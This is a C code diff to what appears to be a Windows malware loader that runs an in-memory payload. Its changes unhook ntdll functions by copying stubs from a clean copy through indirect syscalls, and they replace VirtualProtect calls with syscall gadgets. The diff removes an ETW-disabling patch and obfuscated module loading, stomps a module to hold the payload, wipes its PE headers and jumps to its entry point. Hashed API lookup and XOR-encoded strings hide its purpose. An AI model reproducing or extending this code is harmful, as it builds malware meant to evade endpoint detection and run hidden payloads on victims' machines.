@@ -245,48 +245,30 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                     FARPROC pNtAVM = GetExpH((HMODULE)ntClean, 0xC56666C0u);
                     if (pNtAVM) ssnAVM = *(DWORD*)((BYTE*)pNtAVM + 4);
 
+                    (void)ssnAVM;
+
                     if (ssnVP && gadget) {
-                        PIMAGE_SECTION_HEADER ntSec2 = IMAGE_FIRST_SECTION(ntNhC);
-                        for (WORD si = 0; si < ntNhC->FileHeader.NumberOfSections; si++) {
-                            if (ntSec2[si].Characteristics & 0x20) {
-                                BYTE* hookedText = (BYTE*)hNT + ntSec2[si].VirtualAddress;
-                                BYTE* cleanText = ntClean + ntSec2[si].VirtualAddress;
-                                SIZE_T textSz = ntSec2[si].Misc.VirtualSize;
-                                DWORD oldP;
-                                DoIndirectVP(hookedText, textSz, 0x40, &oldP, ssnVP, gadget);
-                                for (DWORD j = 0; j < (DWORD)textSz; j++)
-                                    hookedText[j] = cleanText[j];
-                                DoIndirectVP(hookedText, textSz, oldP, &oldP, ssnVP, gadget);
-                                break;
-                            }
+                        DWORD uhOld;
+                        const DWORD stubSz = 32;
+                        FARPROC pNtQIP_h = GetExpH((HMODULE)hNT, 0x7E922A50u);
+                        FARPROC pNtQIP_c = GetExpH((HMODULE)ntClean, 0x7E922A50u);
+                        if (pNtQIP_h && pNtQIP_c) {
+                            DoIndirectVP((LPVOID)pNtQIP_h, (SIZE_T)stubSz, 0x40, &uhOld, ssnVP, gadget);
+                            for (DWORD b = 0; b < stubSz; b++) ((BYTE*)pNtQIP_h)[b] = ((BYTE*)pNtQIP_c)[b];
+                            DoIndirectVP((LPVOID)pNtQIP_h, (SIZE_T)stubSz, uhOld, &uhOld, ssnVP, gadget);
+                        }
+                        FARPROC pNtRVM_h = GetExpH((HMODULE)hNT, 0xE2DA87CFu);
+                        FARPROC pNtRVM_c = GetExpH((HMODULE)ntClean, 0xE2DA87CFu);
+                        if (pNtRVM_h && pNtRVM_c) {
+                            DoIndirectVP((LPVOID)pNtRVM_h, (SIZE_T)stubSz, 0x40, &uhOld, ssnVP, gadget);
+                            for (DWORD b = 0; b < stubSz; b++) ((BYTE*)pNtRVM_h)[b] = ((BYTE*)pNtRVM_c)[b];
+                            DoIndirectVP((LPVOID)pNtRVM_h, (SIZE_T)stubSz, uhOld, &uhOld, ssnVP, gadget);
                         }
                     }
-                    (void)ssnAVM;
                 }
             } else {
                 pCH(hNtF);
             }
-        }
-    }
-
-    char cj[16];
-    const unsigned char enc_cj[] = {0x4A,0x45,0x5B,0x43,0x40,0x5D,0x07,0x4D,0x45,0x45};
-    xd(cj, enc_cj, sizeof(enc_cj), 0x29);
-    HMODULE hCJ = pLLA(cj);
-    BYTE* cjText = NULL;
-    if (hCJ) {
-        PIMAGE_DOS_HEADER cjD = (PIMAGE_DOS_HEADER)hCJ;
-        PIMAGE_NT_HEADERS cjN = (PIMAGE_NT_HEADERS)((ULONG_PTR)hCJ + cjD->e_lfanew);
-        PIMAGE_SECTION_HEADER cjS = IMAGE_FIRST_SECTION(cjN);
-        for (WORD i = 0; i < cjN->FileHeader.NumberOfSections; i++) {
-            if (cjS[i].Characteristics & 0x20) {
-                cjText = (BYTE*)hCJ + cjS[i].VirtualAddress;
-                break;
-            }
-        }
-        if (cjText) {
-            DWORD old;
-            pVP(cjText, 4096, 0x40, &old);
         }
     }
 
@@ -426,7 +408,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         DWORD stSz = stNh->OptionalHeader.SizeOfImage;
         if (stSz < imgSz) return 33;
         DWORD oldp;
-        pVP((LPVOID)hSM, stSz, 0x04, &oldp);
+        DoIndirectVP((LPVOID)hSM, (SIZE_T)stSz, 0x04, &oldp, ssnVP, gadget);
         for (DWORD z = 0; z < stSz; z++) ((BYTE*)hSM)[z] = 0;
         img = (LPVOID)hSM;
 
@@ -551,17 +533,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    if (hNT) {
-        char etw[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
-        FARPROC pETW = pGPA(hNT, etw);
-        if (pETW) {
-            DWORD oldETW;
-            pVP((LPVOID)pETW, 4, 0x40, &oldETW);
-            ((BYTE*)pETW)[0] = 0x33; ((BYTE*)pETW)[1] = 0xC0; ((BYTE*)pETW)[2] = 0xC3;
-            pVP((LPVOID)pETW, 4, oldETW, &oldETW);
-        }
-    }
-
     {
         PIMAGE_SECTION_HEADER ps = IMAGE_FIRST_SECTION(
             (PIMAGE_NT_HEADERS)((BYTE*)img + ((PIMAGE_DOS_HEADER)img)->e_lfanew));
@@ -572,7 +543,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             else if (ch & 0x80000000) prot = 0x04;
             else prot = 0x02;
             DWORD osp;
-            pVP((BYTE*)img + ps[si].VirtualAddress, ps[si].Misc.VirtualSize, prot, &osp);
+            DoIndirectVP((BYTE*)img + ps[si].VirtualAddress, (SIZE_T)ps[si].Misc.VirtualSize, prot, &osp, ssnVP, gadget);
         }
     }
 
@@ -636,7 +607,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             fakeA[0]='p'; fakeA[1]='.'; fakeA[2]='e'; fakeA[3]='x'; fakeA[4]='e'; fakeA[5]=' ';
             int ai = 6;
             for (char* s = extraArgs; *s && ai < 2046; s++) {
-                if (*s != '"') fakeA[ai++] = *s;
+                fakeA[ai++] = *s;
             }
             fakeA[ai] = 0;
             int wLen = pMBTWC(0, 0, fakeA, -1, NULL, 0);
@@ -697,9 +668,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         for (DWORD wi = 0; wi < total; wi++) ((BYTE*)buf)[wi] = 0;
 
-        pVP(img, hdSz, 0x04, &hdOld);
+        DoIndirectVP(img, (SIZE_T)hdSz, 0x04, &hdOld, ssnVP, gadget);
         for (DWORD i = 0; i < hdSz; i++) ((BYTE*)img)[i] = 0;
-        pVP(img, hdSz, 0x02, &hdOld);
+        DoIndirectVP(img, (SIZE_T)hdSz, 0x02, &hdOld, ssnVP, gadget);
 
         ULONG_PTR ep = (ULONG_PTR)img + epRVA;
         ((void(*)())ep)();
